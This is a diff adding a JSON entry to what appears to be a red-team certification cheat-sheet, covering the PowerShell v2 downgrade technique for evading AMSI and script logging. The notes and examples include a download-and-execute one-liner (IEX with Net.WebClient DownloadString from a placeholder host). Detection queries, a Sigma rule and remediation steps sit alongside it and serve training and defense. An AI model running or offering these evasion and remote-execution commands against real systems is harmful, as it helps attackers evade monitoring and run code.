@@ -1,0 +1,91 @@
+{
+  "id": "ps-downgrade-attack",
+  "name": "PowerShell Downgrade Attack - Bypass Logging and AMSI",
+  "command": "powershell -version 2",
+  "description": "Forcing PowerShell v2 bypasses Script Block Logging, Module Logging, Transcription, and AMSI - all protections added in v3+. If .NET 2.0/3.5 is installed (common on older servers), PowerShell v2 engine is available even on modern Windows. The simplest evasion technique that still works.",
+  "platform": "windows",
+  "type": "command",
+  "opsec": "moderate",
+  "category": "Active Directory",
+  "subcategory": "Evasion",
+  "certifications": [
+    "CRTP",
+    "CPTS",
+    "OSCP"
+  ],
+  "primary_cert": "CRTP",
+  "source": "CRTP evasion module; common red team technique",
+  "tags": [
+    "powershell",
+    "downgrade",
+    "evasion",
+    "amsi-bypass",
+    "logging-bypass",
+    "v2"
+  ],
+  "mitre": [
+    "T1059.001",
+    "T1562.001"
+  ],
+  "exam": "exam-ok",
+  "notes": "=== THE IDEA ===\nPowerShell v2 has NONE of the modern security features:\n- No Script Block Logging (Event 4104)\n- No Module Logging\n- No Transcription\n- No AMSI (Antimalware Scan Interface)\n- No Constrained Language Mode enforcement\n\n=== USAGE ===\n  powershell -version 2\n  # Check version: $PSVersionTable.PSVersion\n  # Should show Major: 2\n\n=== DETECTION ===\n  # Check if v2 engine is installed:\n  Get-WindowsOptionalFeature -Online -FeatureName MicrosoftWindowsPowerShellV2\n  # Requires .NET 2.0/3.5\n\n=== FROM CMD ===\n  powershell.exe -Version 2 -Command \"IEX (New-Object Net.WebClient).DownloadString('http://<ip>/script.ps1')\"\n\n=== LIMITATIONS ===\n- Requires .NET Framework 2.0/3.5 installed\n- Process creation still logged (Event 4688 / Sysmon 1)\n- The -Version 2 argument itself is detectable in command line\n- Some modern cmdlets not available in v2\n\n=== REMEDIATION ===\n  # Remove PowerShell v2 engine:\n  Disable-WindowsOptionalFeature -Online -FeatureName MicrosoftWindowsPowerShellV2Root\n  # Remove .NET 2.0/3.5 if not needed",
+  "examples": [
+    {
+      "label": "Launch PowerShell v2",
+      "command": "powershell -version 2"
+    },
+    {
+      "label": "Run script via v2 from cmd",
+      "command": "powershell.exe -Version 2 -Command \"IEX (New-Object Net.WebClient).DownloadString('http://<ip>/script.ps1')\""
+    },
+    {
+      "label": "Check if v2 engine is available",
+      "command": "Get-WindowsOptionalFeature -Online -FeatureName MicrosoftWindowsPowerShellV2"
+    }
+  ],
+  "references": [
+    {
+      "title": "MITRE T1059.001 - PowerShell",
+      "url": "https://attack.mitre.org/techniques/T1059/001/"
+    },
+    {
+      "title": "PowerShell Downgrade Attacks",
+      "url": "https://www.leeholmes.com/detecting-and-preventing-powershell-downgrade-attacks/"
+    }
+  ],
+  "defense": {
+    "why_it_works": "PowerShell v2 predates all modern security controls. By explicitly requesting the v2 engine, attackers bypass AMSI, script block logging, and CLM.",
+    "prerequisites": ".NET Framework 2.0/3.5 and PowerShell v2 engine installed on target.",
+    "impact": "Complete bypass of PowerShell security logging and AMSI scanning.",
+    "detection": "[MITRE T1059.001] Process creation with '-version 2' or '-v 2' argument; Event 400 with EngineVersion=2; Sysmon Event 1.",
+    "artifacts": "Process creation logs with PowerShell v2 arguments; Event 400/403 with v2 engine version.",
+    "splunk_spl": "index=sysmon EventCode=1 Image=\"*powershell*\" CommandLine=\"*-version 2*\" OR CommandLine=\"*-v 2*\"\n| table _time, User, CommandLine, ParentCommandLine",
+    "elastic_kql": "process.name:\"powershell.exe\" AND process.command_line:(*-version?2* OR *-v?2*)",
+    "sentinel_kql": "SecurityEvent\n| where EventID == 4688\n| where NewProcessName endswith \"powershell.exe\"\n| where CommandLine contains \"-version 2\" or CommandLine contains \"-v 2\"\n| project TimeGenerated, Account, CommandLine",
+    "sigma_rules": "proc_creation_win_powershell_downgrade",
+    "prevention": "Remove PowerShell v2 engine: Disable-WindowsOptionalFeature -Online -FeatureName MicrosoftWindowsPowerShellV2Root; remove .NET 2.0/3.5 if not needed.",
+    "sources": [
+      "CRTP evasion module",
+      "https://attack.mitre.org/techniques/T1059/001/"
+    ],
+    "detections": [
+      {
+        "platform": "sigma",
+        "name": "PowerShell Downgrade to v2",
+        "logic": "title: PowerShell Downgrade Attack\nstatus: stable\nlogsource:\n  category: process_creation\n  product: windows\ndetection:\n  selection:\n    Image|endswith: '\\powershell.exe'\n    CommandLine|contains:\n      - '-version 2'\n      - '-v 2'\n  condition: selection\nlevel: high",
+        "data_source": "sysmon",
+        "log_ids": [
+          "1"
+        ],
+        "attack": [
+          "T1059.001",
+          "T1562.001"
+        ],
+        "fidelity": "signature",
+        "confidence": "high",
+        "false_positives": "Legacy scripts requiring PowerShell v2",
+        "tuning": "Correlate with subsequent suspicious PowerShell activity"
+      }
+    ]
+  }
+}
